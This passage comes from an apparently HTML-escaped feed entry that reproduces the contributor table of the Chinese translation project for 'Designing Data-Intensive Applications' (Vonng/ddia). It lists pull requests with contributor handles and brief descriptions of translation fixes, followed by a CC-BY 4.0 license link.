href=&#34;https://github.com/LHRchina&#34;&gt;@LHRchina&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;修复语句小bug&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/16&#34;&gt;16 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/MuAlex&#34;&gt;@MuAlex&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Master&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/15&#34;&gt;15 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/cg-zhou&#34;&gt;@cg-zhou&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Update translation progress&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/14&#34;&gt;14 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/cg-zhou&#34;&gt;@cg-zhou&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Translate glossary&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/13&#34;&gt;13 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/cg-zhou&#34;&gt;@cg-zhou&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;详细修改了后记中和印度野猪相关的描述&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/12&#34;&gt;12 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/ibyte2011&#34;&gt;@ibyte2011&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;修改了部分翻译&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/11&#34;&gt;11 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/jiajiadebug&#34;&gt;@jiajiadebug&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch2 100%&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/10&#34;&gt;10 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/jiajiadebug&#34;&gt;@jiajiadebug&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch2 20%&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/9&#34;&gt;9 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/jiajiadebug&#34;&gt;@jiajiadebug&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Preface, ch1, part-i translation minor fixes&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/7&#34;&gt;7 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/MuAlex&#34;&gt;@MuAlex&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Ch6 translation pull request&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/6&#34;&gt;6 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/MuAlex&#34;&gt;@MuAlex&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Ch6 change version1&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/5&#34;&gt;5 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/nevertiree&#34;&gt;@nevertiree&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Chapter 01语法微调&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/2&#34;&gt;2 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/seagullbird&#34;&gt;@seagullbird&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;序言初翻&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;  &lt;/tbody&gt; &#xA; &lt;/table&gt; &#xA;&lt;/details&gt; &#xA;&lt;h2&gt;协议&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Vonng/ddia/master/LICENSE&#34;&gt;CC-BY 4.0&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
</feed>